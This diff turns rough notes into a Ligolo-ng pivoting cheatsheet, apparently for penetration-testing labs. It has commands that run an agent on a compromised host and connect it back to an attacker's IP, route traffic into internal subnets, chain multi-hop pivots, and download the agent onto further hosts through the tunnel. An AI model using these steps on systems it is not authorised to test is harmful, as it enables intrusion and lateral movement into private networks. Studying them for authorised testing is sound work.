@@ -1,146 +1,156 @@
-https://github.com/nicocha30/ligolo-ng
+# Ligolo-ng Cheatsheet
 
-Starting
-	use port 11601 if possible as it lets us ALSO add a loopback route.
+> Reference: https://github.com/nicocha30/ligolo-ng  
+> Use port **11601** where possible — required for loopback routes.
+
+---
+
+## Placeholders
+
+|Symbol|Meaning|
+|---|---|
+|`<LHOST>`|Your attacker IP|
+|`<subnet>`|Internal subnet discovered via `ifconfig` in ligolo console|
+|`<no.>`|Interface number (1, 2, 3...) for multi-pivot setups|
+
+---
+
+## Quick Start (Single Pivot)
+
 ```bash
-#Creating interface and starting it.
+# ── ATTACKER: create tun interface ───────────────────────────────────────────
 sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
 
-# Remove interface -- for troublshooting
-sudo ip link set ligolo down
-sudo ip tuntap del dev ligolo mode tun
-sudo ip route del <subnet>/<cidr> dev ligolo # only if you need to delete route
-
-#Attacker machine
+# ── ATTACKER: start proxy ────────────────────────────────────────────────────
 ./proxy -laddr 0.0.0.0:11601 -selfcert
 
-#Compromised machine
-.\agent.exe -connect <LHOST>:11601 -ignore-cert
+# ── VICTIM: connect agent ────────────────────────────────────────────────────
+.\agent.exe -connect <LHOST>:11601 -ignore-cert      # Windows
+./agent     -connect <LHOST>:11601 -ignore-cert      # Linux
 
-#In Ligolo-ng console
-session  #select host
-ifconfig #Notedown the internal network's subnet
+# ── LIGOLO CONSOLE ───────────────────────────────────────────────────────────
+session      # select host
+ifconfig     # note the internal subnet
 
-#Adding subnet to ligolo interface - Kali linux
-sudo ip r add <subnet> dev ligolo
-	# optional -- loopback :) -- see Regarding Loopbacks
-	sudo ip r add 240.0.0.<no.>/32 dev ligolo<no.>
+# ── ATTACKER: add route to internal subnet ───────────────────────────────────
+sudo ip r add <subnet>/<cidr> dev ligolo
+sudo ip r add 240.0.0.1/32 dev ligolo    # optional loopback (see Loopbacks)
 
-#In Ligolo-ng console
-start    #after adding relevent subnet to ligolo interface
-
+# ── LIGOLO CONSOLE ───────────────────────────────────────────────────────────
+start
 ```
 
-Once all of this is done and ligolo is started, ip a will show the interface as UP
-you can now perform commands from a terminal of your own to the internal subnet
+> Once started, `ip a` shows the interface as UP and the internal subnet is fully reachable.  
+> `iwr` (Invoke-WebRequest) works well for file transfers through the tunnel.
 
-Invoke-WebRequest (iwr) for file transfer works best in my experience
+---
 
-If we want to add more routes, add paths, add listeners but have one central agent
-https://docs.ligolo.ng/sample/double/
+## File Transfer Through Tunnel
 
-File Transfer 
+Useful when you can't drop another agent on the next box yet. Traffic hitting `agent1:8080` forwards back to your Kali on port 80.
+
 ```bash
-# In case you cannot transfer an additional agent onto the next box, you can try the following on PROXY. Each listener_add is specific to the SESSION you are in.
-
+# ── LIGOLO CONSOLE (current session) ─────────────────────────────────────────
 listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 --tcp
+# Note: listener_add is scoped per session — same port can be reused across sessions
 
-# Host a python3 http server on KALI
-
+# ── KALI: host files ─────────────────────────────────────────────────────────
 python3 -m http.server 80
 
-# Then on the box that is sequestered, file transfer 
-
-wget http://<agent1_internal_ip>:8080/agent.exe -o agent.exe
-
-or
-
-iwr -uri http://<agent1_internal_ip>:8080/agent.exe -Outfile agent.exe
+# ── SEQUESTERED BOX: pull files via agent1's internal IP ─────────────────────
+wget http://<agent1_internal_ip>:8080/agent.exe -O agent.exe   # Linux
+iwr -uri http://<agent1_internal_ip>:8080/agent.exe -Outfile agent.exe  # PowerShell
 ```
 
-https://medium.com/@Poiint/pivoting-with-ligolo-ng-0ca402abc3e9
+---
 
-Adding Listeners
+## Adding More Pivots (Multi-Hop)
+
+Reference: https://docs.ligolo.ng/sample/double/
+
 ```bash
-# (do this from the ligolo terminal interface)
-#On PROXY terminal - repeat on each listener (session) as needed (each session is seperate so the same port can be reused)
-listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
-
-
-#On Victim box
-
-./ligolo-agent --connect <ip_agent<no.>>:11601 -ignore-cert
-session
-then proceed to Adding more subnet routes/interfaces
-# if you want loopback here, add a new route, then start
-	# see "Adding more subnet routes/interfaces"
-```
-
-Adding more subnet routes/interfaces
-```bash
-# Create new interface per new subnet
-
+# ── THE FLOW: ────────────────────────────────────────────────────────────────
+ATTACKER ──────────── agent1 (sees Net A + Net B)
+                      └───────────────────── agent2 (on Net B)
+                      
+# ── ATTACKER: new interface per additional subnet ────────────────────────────
+# You already have ligolo for Net A. You need a new one for Net B.
 sudo ip tuntap add user $(whoami) mode tun ligolo<no.>
 sudo ip link set ligolo<no.> up
 sudo ip r add <new_subnet>/<cidr> dev ligolo<no.>
 
-# from ligolo proxy
+# ── LIGOLO CONSOLE (session of agent that can reach the next box) ────────────
+# Tell agent1 to relay incoming agent connections
+listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
 
-session <no.>
-ifconfig
-start --tun ligolo<no.>       #(from proxy)
+# ── NEXT VICTIM BOX: connect through the chain ───────────────────────────────
+./agent -connect <agent1_internal_ip>:11601 -ignore-cert
+
+# ── LIGOLO CONSOLE ───────────────────────────────────────────────────────────
+# Start the tunnel on the new interface
+session                       # select the new session
+ifconfig                      # confirm subnet
+start --tun ligolo<no.>
 ```
 
-Regarding loopbacks
-	we can have a loopback for every box we want!
-	just requires more listeners
+---
+
+## Loopbacks
+
+Each pivot can have its own loopback — lets you reach services bound to localhost on the remote box via `240.0.0.<no.>:<port>` from your attacker machine.
+
 ```bash
-# add loopback per interface
-sudo ip r add 240.0.0.<no.>/32 dev ligolo<no.>
+# ── ATTACKER: add one loopback route per pivot ───────────────────────────────
+sudo ip r add 240.0.0.1/32 dev ligolo        # pivot 1
+sudo ip r add 240.0.0.2/32 dev ligolo2       # pivot 2
+# ... no limit
 
-____________________________________________________
-example of what this looks like
-
+# ── RESULT ───────────────────────────────────────────────────────────────────
 ip r
-	240.0.0.1 dev ligolo scope link 
-	240.0.0.2 dev ligolo2 scope link 
-```
-basically here, i have a loopback .1 on interface "`ligolo`" and another loopback .2 on interface "`ligolo2`". There is no limit to this...
-![[Pasted image 20250608163925.png]]
-
-Delete routes -- for mess ups :)
-```bash
-sudo ip r del <ip_route>/<cidr> dev ligolo<no.>
+  240.0.0.1 dev ligolo    scope link   # loopback for pivot 1
+  240.0.0.2 dev ligolo2   scope link   # loopback for pivot 2
 ```
 
-Show all routes
+---
+
+## Route Management
+
 ```bash
+# Show all routes
 ip r
+
+# Add a route
+sudo ip r add <subnet>/<cidr> dev ligolo<no.>
+
+# Delete a specific route
+sudo ip r del <subnet>/<cidr> dev ligolo<no.>
 ```
 
+---
 
-___
-possibly remove this...
+## Teardown / Cleanup
 
-Local Port Forwarding (alternative to chisel)
-	I have incorporated this step to the Starting section up above
-```
-# Create interface (if not already done)
-	sudo ip tuntap add user $(whoami) mode tun ligolo
-	sudo ip link set ligolo up
-
-# Create tunnel
-	./proxy -laddr 0.0.0.0:11601 -selfcert
-	./agent --connect <LHOST>:11601 -ignore-cert
-
-# add loopback route
-	sudo ip r add 240.0.0.1/32 dev ligolo
-
-# On ligolo proxy terminal
-	session #select session
-	start
-
+```bash
+sudo ip link set ligolo<no.> down
+sudo ip tuntap del dev ligolo<no.> mode tun
+sudo ip route del <subnet>/<cidr> dev ligolo<no.>   # if route wasn't auto-removed
 ```
 
+---
 
+## Troubleshooting
+
+|Problem|Fix|
+|---|---|
+|Interface already exists|Run teardown, then recreate|
+|Agent connects but no traffic|Confirm route is added and `start` was run in console|
+|Can't reach loopback service|Ensure `240.0.0.<no.>/32` route exists on correct interface|
+|Multi-hop agent won't connect|Confirm `listener_add` is set on the right session before connecting|
+
+---
+
+## Further Reading
+
+- Double pivot walkthrough: https://docs.ligolo.ng/sample/double/
+- Pivoting guide: https://medium.com/@Poiint/pivoting-with-ligolo-ng-0ca402abc3e9
